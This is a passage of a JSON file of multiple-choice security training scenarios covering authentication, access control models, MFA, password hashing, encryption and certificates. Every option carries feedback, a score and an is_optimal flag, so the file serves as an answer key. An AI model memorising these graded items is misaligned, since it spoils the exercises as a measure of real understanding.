            "text": "Annual review of all policies, plus ad-hoc review when regulations, threats, or business needs change significantly",
            "feedback": "Excellent maintenance approach. Annual reviews ensure systematic coverage. Ad-hoc reviews respond to changes - new regulations, major incidents, business changes. This combination keeps policies current and relevant while not being burdensome.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Monthly review of all policies to ensure they're always current",
            "feedback": "Monthly review of all policies is excessive for most organizations. Policies don't change that frequently, and constant review creates change fatigue without adding value. Annual with ad-hoc triggers is more practical.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Review policies every five years - they shouldn't change often",
            "feedback": "Five years is far too long. Threats evolve, regulations change, technology advances. A five-year-old security policy is likely significantly outdated and may expose the organization to compliance findings and security risks.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Balance is key - not too frequent (burdensome), not too rare (outdated). What events should trigger review?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Industry standard: Annual systematic review + ad-hoc when triggered by regulatory changes, incidents, or business changes.",
            "penalty": 5
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D1-REM-002",
    "title": "Authentication & Access Foundations",
    "domain": 1,
    "type": "REM",
    "difficulty": "beginner",
    "time_estimate": "30-40 minutes",
    "role": "security_engineer",
    "organization": {
      "name": "SecureStart Solutions",
      "industry": "Technology - SaaS Provider",
      "size": "180 employees, fully remote, cloud-native"
    },
    "introduction": "Welcome to Authentication & Access Foundations. You will make critical security decisions.",
    "learning_objectives": [
      "1.2",
      "4.6"
    ],
    "decision_points": [
      {
        "id": "D1R2-DP-001",
        "sequence": 1,
        "title": "AAA Fundamentals",
        "situation": "Your manager asks you to explain what happens when an employee logs into the company's HR system and views their pay stub. Walk through the AAA process.\n\n**Question:** What is the correct sequence of AAA operations for this scenario?",
        "options": [
          {
            "id": "A",
            "text": "Authorization (check if they can access HR) \u00e2\u2020\u2019 Authentication (verify identity) \u00e2\u2020\u2019 Accounting (log the access)",
            "feedback": "The order is wrong. You can't authorize someone before you know who they are. Authentication must come first - you need to verify identity before checking permissions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Authentication (verify identity) \u00e2\u2020\u2019 Authorization (check permissions) \u00e2\u2020\u2019 Accounting (log the access)",
            "feedback": "Correct! First, authentication verifies the employee is who they claim (login). Then authorization checks if they can view pay stubs (permission check). Finally, accounting logs that they accessed the system and viewed their stub.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Accounting (log the attempt) \u00e2\u2020\u2019 Authentication (verify identity) \u00e2\u2020\u2019 Authorization (grant access)",
            "feedback": "While logging the attempt early has value, the functional sequence is AuthN \u00e2\u2020\u2019 AuthZ. Accounting primarily records what happened after access decisions, though login attempts may be logged regardless of success.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Authentication and Authorization happen simultaneously, then Accounting",
            "feedback": "They're sequential, not simultaneous. The system must know WHO before it can determine WHAT they can do. Authorization decisions depend on the authenticated identity.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Think about the logical dependency: Can you check someone's permissions before you know who they are?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "AuthN (who?) \u00e2\u2020\u2019 AuthZ (what can they do?) \u00e2\u2020\u2019 Accounting (what did they do?)",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-002",
        "sequence": 2,
        "title": "Authentication vs Authorization",
        "situation": "A help desk ticket reads: 'I can log in fine, but I get Access Denied when trying to open the Q4 financial report.'\n\n**Question:** Is this an authentication problem or an authorization problem?",
        "options": [
          {
            "id": "A",
            "text": "Authentication - they need to prove their identity differently",
            "feedback": "They can log in successfully - that means authentication is working. The identity verification step passed. The problem occurs after login when trying to access a specific resource.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Authorization - they're authenticated but lack permission for that resource",
            "feedback": "Correct! Successful login means authentication passed - the system verified their identity. 'Access Denied' on a specific resource means authorization failed - they don't have permission to access the Q4 financial report.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Accounting - the system isn't logging their access properly",
            "feedback": "Accounting problems would be about missing logs or audit trails, not 'Access Denied' errors. The user is being actively blocked from a resource - that's an authorization decision.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Both - they need to re-authenticate for financial data",
            "feedback": "Step-up authentication for sensitive data is a valid concept, but the ticket describes 'Access Denied,' not a re-authentication prompt. The current issue is permissions. If step-up auth was needed, they'd see an authentication challenge.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Did they prove who they are? (login worked = yes). Do they have permission for that resource? (Access Denied = no)",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Authentication = identity verification (login). Authorization = permission check (access to specific resources).",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-003",
        "sequence": 3,
        "title": "Authentication Factors",
        "situation": "The company is implementing MFA. A colleague suggests requiring both a password and a security question for all users.\n\n**Question:** Is this true multi-factor authentication?",
        "options": [
          {
            "id": "A",
            "text": "Yes - two pieces of information are required",
            "feedback": "Multi-factor isn't about the number of inputs - it's about different TYPES of factors. Password and security question are both 'something you know.' Two knowledge factors don't provide MFA's security benefits.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "No - both are 'something you know' factors; true MFA requires different factor types",
            "feedback": "Exactly right. MFA requires factors from different categories (know, have, are). Password + security question = two knowledge factors = single-factor authentication with extra steps. True MFA example: password (know) + authenticator app code (have).",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Yes - the more questions, the more secure",
            "feedback": "More of the same factor type doesn't significantly improve security. An attacker who phishes a password can phish security questions too. The strength of MFA comes from requiring different attack methods to compromise different factor types.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "It depends on how complex the security question is",
            "feedback": "Complexity doesn't change the factor type. A complex security question is still 'something you know.' The vulnerability is the factor category, not the complexity. Both can be stolen via phishing regardless of complexity.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What factor type is a password? What factor type is a security question? Are they the same?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "MFA = different factor TYPES. Password = know. Security question = know. Same type = not MFA.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-004",
        "sequence": 4,
        "title": "MFA Implementation",
        "situation": "You're recommending MFA methods for the company. The CISO asks which MFA option provides the strongest protection against phishing attacks.\n\n**Question:** Which MFA method is MOST resistant to phishing?",
        "options": [
          {
            "id": "A",
            "text": "SMS-based one-time passwords",
            "feedback": "SMS OTP is vulnerable to several attacks: SIM swapping, SS7 protocol attacks, and real-time phishing (attacker proxies victim's SMS code). Better than no MFA, but not phishing-resistant.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Email-based one-time passwords",
            "feedback": "Email OTP has a circular dependency problem - if attackers phish your email password, they get your MFA codes too. Also vulnerable to real-time phishing proxy attacks. Generally considered weak MFA.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "TOTP authenticator app (Google Authenticator, Authy)",
            "feedback": "TOTP apps are much better than SMS/email - codes are generated locally, not transmitted. However, they're still phishable via real-time proxy attacks where attackers capture and replay codes. Good but not phishing-resistant.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "FIDO2/WebAuthn security keys",
            "feedback": "Excellent! FIDO2 security keys are phishing-resistant by design. They cryptographically verify the legitimate site's domain - they won't authenticate to a phishing site even if the user is tricked. The key literally cannot be fooled by a fake website.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Real-time phishing proxies can capture and replay codes. What can't be replayed?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "FIDO2/WebAuthn keys verify the website's domain cryptographically - they won't authenticate to a fake site.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-005",
        "sequence": 5,
        "title": "Access Control Models - DAC",
        "situation": "In Google Drive, employees can share their files with anyone they choose - coworkers, external partners, even personal accounts. An employee shared a sensitive client proposal with their personal email.\n\n**Question:** What access control model does this represent, and what's the weakness demonstrated?",
        "options": [
          {
            "id": "A",
            "text": "RBAC - the employee's role allowed them to share files",
            "feedback": "RBAC assigns permissions based on roles, but the scenario shows the owner deciding who to share with, not role-based automatic permissions. The employee chose to share - that's owner discretion, not role assignment.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "DAC - owner controls access, weakness is users may share inappropriately",
            "feedback": "Correct! Discretionary Access Control lets resource owners control sharing. Google Drive's sharing model is DAC. The weakness: owners might share carelessly or maliciously. There's no system enforcement of data classification or need-to-know.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "MAC - the system should have blocked the share based on classification",
            "feedback": "MAC would have blocked this - that's why it SHOULD have been MAC but wasn't. MAC uses labels (like classification levels) enforced by the system. Google Drive without additional controls is DAC, not MAC. The incident shows DAC's weakness.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "ABAC - attributes should have prevented external sharing",
            "feedback": "ABAC could prevent this if configured, but standard file sharing without attribute-based policies is DAC. ABAC would evaluate conditions (is recipient external? is file classified?) - but that wasn't in place here.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Who made the sharing decision? The owner. What model gives owners control?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "DAC = Discretionary = owner decides. The 'D' in DAC means owner discretion.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-006",
        "sequence": 6,
        "title": "Access Control Models - RBAC",
        "situation": "The company is implementing Okta for access management. The team proposes creating roles like 'Engineer,' 'Sales,' 'HR,' and 'Finance' with predefined application access for each role.\n\n**Question:** What access control model is being implemented, and what's a key benefit?",
        "options": [
          {
            "id": "A",
            "text": "DAC - users will control their own access",
            "feedback": "This isn't DAC - the proposal describes predefined roles with assigned permissions, not owner discretion. Users are assigned to roles; they don't choose their own permissions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "MAC - access is mandatory based on job function",
            "feedback": "MAC uses classification labels (Secret, Top Secret) enforced by the system, typically in government contexts. Job-based roles without classification labels is RBAC, not MAC. 'Mandatory' in MAC refers to label-based enforcement.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "RBAC - roles simplify administration and ensure consistent access by job function",
            "feedback": "Correct! Role-Based Access Control assigns users to roles (Engineer, Sales) and roles to permissions (app access). Key benefits: simplified administration (manage roles not individual users), consistency (everyone in a role gets same access), easier onboarding/offboarding.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "ABAC - attributes define access",
            "feedback": "ABAC uses multiple attributes (department + location + time + resource type) for dynamic decisions. Simple role assignment without additional contextual attributes is RBAC. ABAC would be: 'Engineers in US during business hours can access production.'",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Users are assigned to roles, roles have permissions. What model does this describe?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "RBAC = Role-Based. Roles (job functions) \u00e2\u2020\u2019 Permissions. Users \u00e2\u2020\u2019 Roles. Simplifies administration.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-007",
        "sequence": 7,
        "title": "Least Privilege Principle",
        "situation": "A developer requests admin access to the production database 'to debug occasional issues.' Currently they have read-only access.\n\n**Question:** How should you apply the principle of least privilege to this request?",
        "options": [
          {
            "id": "A",
            "text": "Grant permanent admin access - they're a trusted employee and need to do their job",
            "feedback": "Permanent elevated access violates least privilege. 'Occasional issues' doesn't justify permanent admin access. Trust isn't a substitute for access controls - even trusted employees should have minimal necessary permissions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Deny the request - developers shouldn't have any production access",
            "feedback": "Complete denial might not support business needs. They have a legitimate use case (debugging). Least privilege means minimum necessary access, not zero access. The question is how to provide necessary access minimally.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Provide time-limited, just-in-time admin access that must be requested and approved for each debugging session",
            "feedback": "Excellent application of least privilege! Just-in-time (JIT) access provides admin rights only when needed, for limited duration, with approval workflow. This meets the business need while minimizing standing privileges. If credentials are compromised during non-debugging time, no admin access exists.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Grant admin access but monitor their activity closely",
            "feedback": "Monitoring detects misuse but doesn't prevent it. A compromised account with permanent admin access can cause significant damage before monitoring alerts trigger. Least privilege prevents the standing access; monitoring is complementary but not a substitute.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Least privilege = minimum necessary access for minimum necessary time. How do you provide 'occasional' access?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Just-in-time (JIT) access provides elevated permissions only when needed, with time limits and approval.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-008",
        "sequence": 8,
        "title": "Account Types",
        "situation": "During an access review, you find an account called 'backup-service' with admin privileges across multiple systems. It was created two years ago and the password has never been rotated.\n\n**Question:** What type of account is this, and what's the security concern?",
        "options": [
          {
            "id": "A",
            "text": "User account - someone named their account 'backup-service' as a nickname",
            "feedback": "The naming convention and use case (backup service) clearly indicate this is a service account, not a personal user account. Service accounts run automated processes, not human sessions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Service account - concern is excessive privileges and no password rotation",
            "feedback": "Correct! Service accounts run automated processes and often accumulate excess privileges over time ('privilege creep'). Two years without password rotation, plus admin across multiple systems, creates major risk. If compromised, the attacker has persistent, privileged access.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Guest account - external partner access for backup vendor",
            "feedback": "Guest accounts are for temporary external access, typically with limited privileges. An account with admin access across multiple systems created two years ago isn't a guest account profile - it's a service account that's been neglected.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Shared account - multiple people use it for backups",
            "feedback": "Shared accounts are used by multiple humans, creating accountability problems. Service accounts run automated processes, not human sessions. The concern here is service account management, though shared accounts have their own issues.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Accounts named for functions (backup, monitoring, sync) are typically service accounts running automated processes.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Service account risks: often over-privileged, rarely reviewed, non-expiring passwords, no MFA.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-009",
        "sequence": 9,
        "title": "Identity Federation",
        "situation": "The company wants employees to use their company credentials to access third-party SaaS applications (Salesforce, Slack, Zoom) instead of creating separate accounts for each.\n\n**Question:** What identity concept enables this, and what protocol is commonly used?",
        "options": [
          {
            "id": "A",
            "text": "Password synchronization - same password works everywhere",
            "feedback": "Password sync copies passwords across systems - risky because compromise in one place means compromise everywhere, and you're trusting all systems with the actual password. Federation doesn't share passwords - it shares assertions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Single Sign-On (SSO) using SAML or OIDC federation - one login, trusted across services",
            "feedback": "Correct! Federation allows your identity provider (Okta, Azure AD) to assert your identity to service providers (Salesforce, Slack) without sharing passwords. SAML and OIDC/OAuth are common protocols. User authenticates once; assertions grant access to federated services.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "VPN - all traffic goes through company network to access applications",
            "feedback": "VPN provides network access, not identity federation. Users would still need separate credentials for each SaaS app through VPN. Federation solves the identity problem - one set of credentials accepted by multiple services.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Password manager - stores all the different passwords",
            "feedback": "Password managers help users manage multiple credentials but don't eliminate them. Users still have separate accounts in each service. Federation provides true single identity across services without multiple account creation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Federation allows one identity provider to assert identity to multiple service providers. What protocols enable this?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "SAML (Security Assertion Markup Language) and OIDC (OpenID Connect) are federation protocols for SSO.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1R2-DP-010",
        "sequence": 10,
        "title": "Access Review Process",
        "situation": "The security team wants to implement regular access reviews. You need to recommend an approach for reviewing user access rights.\n\n**Question:** What is the BEST approach for conducting access reviews?",
        "options": [
          {
            "id": "A",
            "text": "IT reviews all access annually and removes anything that looks unnecessary",
            "feedback": "IT often doesn't know business context - they can't determine if access is necessary for job function. Access reviews need manager input since managers understand their team's job requirements. IT can facilitate but shouldn't make business decisions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Managers review and certify their team members' access quarterly, with privileged access reviewed more frequently",
            "feedback": "Excellent! Manager certification ensures business context is considered - managers know what their team needs. Quarterly reviews catch changes promptly. More frequent review of privileged access reflects higher risk. This is the industry standard approach.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Users self-certify their own access - they know best what they need",
            "feedback": "Self-certification has obvious conflict of interest - users won't voluntarily give up access. Independent review (manager or access owner) is required for meaningful certification. Users might know what they use, but shouldn't certify what they need.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only review access when employees change roles or leave",
            "feedback": "Event-triggered reviews miss 'privilege creep' - gradual accumulation of access over time without role changes. Regular periodic reviews catch access that's no longer needed even when roles haven't changed. Both periodic and event-triggered reviews are needed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Who understands what access their team needs for their jobs? Not IT - they know systems, not business functions.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Manager certification ensures business relevance. Quarterly catches drift. Privileged access needs more scrutiny.",
            "penalty": 5
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D1-REM-003",
    "title": "Cryptography Clinic",
    "domain": 1,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": 45,
    "role": "security_analyst",
    "organization": {
      "name": "TechStart Academy",
      "industry": "Technology Training & Education"
    },
    "introduction": "Welcome to Cryptography Clinic. You will make critical security decisions.",
    "learning_objectives": [
      "Distinguish between symmetric and asymmetric encryption and their use cases",
      "Select appropriate hash algorithms based on security requirements",
      "Understand PKI components and certificate lifecycle",
      "Apply key management best practices",
      "Recognize common cryptographic mistakes and vulnerabilities",
      "Choose appropriate cryptographic solutions for different scenarios"
    ],
    "decision_points": [
      {
        "id": "D1-REM-003-DP01",
        "sequence": 1,
        "title": "Module 1: The Password Problem",
        "situation": "Your first clinic scenario arrives via helpdesk ticket.\n\n**Ticket #4721:** 'We're building a new student registration portal. The developer asks how to store passwords securely. She's currently using MD5 to hash passwords before storing them. Is this okay?'\n\nSarah looks at you: 'This is foundational. Why do we hash passwords instead of encrypting them? And what's wrong with MD5?'\n\n**Question:** What do you tell the developer about MD5 for password storage?",
        "options": [
          {
            "id": "A",
            "text": "MD5 is cryptographically broken and too fast. Recommend bcrypt or Argon2 with automatic salting and configurable work factor.",
            "feedback": "Excellent! You've identified both problems: MD5 has collision vulnerabilities AND it's too fast. Modern password hashing algorithms like bcrypt and Argon2 are intentionally slow (preventing brute force) and include built-in salting (preventing rainbow tables). The work factor can be increased over time as hardware improves.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "MD5 is fine as long as you add a salt before hashing.",
            "feedback": "Adding salt to MD5 only prevents rainbow table attacks. MD5's fundamental problems remain: it's collision-vulnerable and extremely fast. GPUs can compute billions of MD5 hashes per second. A salt doesn't slow down targeted brute-force attacks against individual passwords.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Use SHA-256 instead - it's the current hashing standard.",
            "feedback": "SHA-256 is excellent for data integrity and signatures, but it's still too FAST for password storage. It can compute billions of hashes per second on GPUs. Password hashing requires intentionally slow algorithms to resist brute-force attacks.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Encrypt the passwords with AES-256 instead of hashing them.",
            "feedback": "Encrypting passwords is wrong for several reasons: you'd need to store the encryption key somewhere (new attack target), anyone with the key could decrypt ALL passwords, and you don't actually need to retrieve passwords - just verify them. Hashing is one-way by design.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "MD5 has two problems for passwords: known vulnerabilities AND speed. What addresses both?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "Check your reference card - what algorithms are specifically designed for password storage?",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP02",
        "sequence": 2,
        "title": "Module 1B: Integrity Verification",
        "situation": "Building on the hashing lesson, Sarah presents another ticket:\n\n**Ticket #4725:** 'The software team distributes training materials as ZIP downloads. They want to help students verify their downloads weren't corrupted or tampered with. What should they provide?'\n\nSarah explains: 'This is a different use case for hashes. Here, speed is actually beneficial since we're checking large files. But we still need collision resistance. What do you recommend?'\n\n**Question:** What hash algorithm do you recommend for download verification?",
        "options": [
          {
            "id": "A",
            "text": "SHA-256 - provides collision resistance for integrity verification and is computationally efficient for large files.",
            "feedback": "Perfect choice. SHA-256 is ideal for file integrity because: it's collision-resistant (prevents attackers from creating malicious files with matching hashes), fast enough for large files, and widely supported. This is exactly what SHA-256 was designed for.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "bcrypt - it's the most secure hashing algorithm available.",
            "feedback": "bcrypt is designed specifically for passwords, not file integrity. It would be extremely slow for large files (by design!) and doesn't provide benefits for this use case. Using the wrong tool for the job creates problems.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "MD5 - it's fast and still commonly used for file checksums.",
            "feedback": "MD5 is indeed fast and still commonly used for non-security checksums (detecting accidental corruption). However, for TAMPER detection, MD5's collision vulnerabilities are a problem. An attacker could create a malicious file with the same MD5 hash. For security purposes, use SHA-256.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "CRC32 - it's the fastest option for file verification.",
            "feedback": "CRC32 is not a cryptographic hash - it's a checksum designed for error detection only. It has no collision resistance and is trivial to manipulate. Anyone can create a different file with the same CRC32. Never use CRC for security purposes.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "For file integrity, you need collision resistance (security) but speed is fine. What fits?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "SHA-256 is the current standard for integrity verification where tampering is a concern.",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP03",
        "sequence": 3,
        "title": "Module 2: The Encryption Question",
        "situation": "Module 2 begins with a database security question.\n\n**Ticket #4730:** 'The student records database contains sensitive information including SSNs and grades. We need to encrypt this data at rest. What encryption should we use?'\n\nSarah adds context: 'This is bulk data encryption - potentially millions of records. Think about what encryption type makes sense for large amounts of data that one system needs to access.'\n\n**Question:** What encryption do you recommend for the student records database?",
        "options": [
          {
            "id": "A",
            "text": "AES-256 symmetric encryption with proper key management stored in a hardware security module (HSM).",
            "feedback": "Excellent recommendation. AES-256 is the standard for data-at-rest encryption: it's fast enough for large databases, provides strong security, and is FIPS-approved. Storing the encryption key in an HSM protects it from extraction. This is industry best practice.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "RSA-4096 asymmetric encryption for maximum security.",
            "feedback": "RSA is asymmetric encryption - designed for small amounts of data like keys and signatures. Encrypting a database with RSA would be extremely slow (thousands of times slower than AES) and isn't how RSA is meant to be used. RSA typically encrypts symmetric keys, not bulk data.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "3DES encryption since it's been used reliably for decades.",
            "feedback": "3DES is deprecated and should not be used for new implementations. Its 64-bit block size makes it vulnerable to Sweet32 birthday attacks when encrypting large amounts of data - exactly what a database does. NIST withdrew 3DES approval in 2023. Use AES.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "SHA-256 to secure the database contents.",
            "feedback": "SHA-256 is a hash function, not encryption. Hashing is one-way - you couldn't retrieve the data! Encryption must be reversible (two-way) so authorized users can access the original data. This is a fundamental distinction.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "For large amounts of data, symmetric encryption is appropriate. What's the current standard?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "AES-256 is the industry standard for data-at-rest encryption.",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP04",
        "sequence": 4,
        "title": "Module 3: Digital Signatures",
        "situation": "Module 3 introduces digital signatures.\n\n**Ticket #4735:** 'The CEO needs to digitally sign important announcements to prove they're authentic and haven't been modified. How do digital signatures work, and what do we need to set up?'\n\nSarah explains: 'This is where asymmetric cryptography shines. The CEO will use her private key to sign, and anyone can use her public key to verify. Walk me through it.'\n\n**Question:** How do you explain the digital signature process to the CEO's office?",
        "options": [
          {
            "id": "A",
            "text": "The document is hashed, then the hash is encrypted with your private key. Anyone can verify by decrypting with your public key and comparing hashes. This proves authenticity and integrity.",
            "feedback": "Perfect explanation! You've correctly described how digital signatures work. The private key creates the signature (only the CEO has it), and the public key verifies it (anyone can check). The hash ensures the document wasn't modified. This provides authentication, integrity, and non-repudiation.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Encrypt the entire document with the CEO's private key so only authorized people can read it.",
            "feedback": "This confuses signing with encryption. Encrypting with a private key doesn't hide the content - anyone with the public key could decrypt it. Also, asymmetric encryption of entire documents is impractical. Digital signatures prove authenticity, not confidentiality.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Create a hash of the document and publish it alongside the announcement.",
            "feedback": "A hash alone proves integrity (document wasn't modified) but NOT authenticity. Anyone could create a hash. Without the private key signature, there's no proof the CEO created it. Digital signatures combine hashing WITH asymmetric cryptography.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Use the CEO's public key to encrypt the document so it can be verified.",
            "feedback": "You've got the keys reversed. Signing uses the PRIVATE key (proves identity). If you encrypted with the public key, anyone could do it - it wouldn't prove the CEO created it. The private key is secret, which is what makes the signature meaningful.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "hint_number": 1,
            "text": "For signatures, which key proves identity - the one that's secret (private) or the one anyone can have (public)?",
            "penalty": 2
          },
          {
            "hint_number": 2,
            "text": "Sign with private (proves it was you), verify with public (anyone can check).",
            "penalty": 3
          }
        ]
      },
      {
        "id": "D1-REM-003-DP05",
        "sequence": 5,
        "title": "Module 4: Certificate Fundamentals",
        "situation": "Module 4 tackles certificates.\n\n**Ticket #4740:** 'A user reported a certificate warning when accessing our learning portal. The browser says the certificate is untrusted. But we have a valid certificate - why would browsers not trust it?'\n\nSarah asks: 'Before we troubleshoot, let's make sure you understand HOW certificate trust works. What makes a browser trust a certificate?'\n\n**Question:** After investigation, you find the server is only sending the end-entity certificate, not the intermediate CA certificate. What's the fix?",
        "options": [
          {
            "id": "A",
            "text": "Configure the server to send the full certificate chain including the intermediate CA certificate. Browsers need the complete chain to verify trust.",
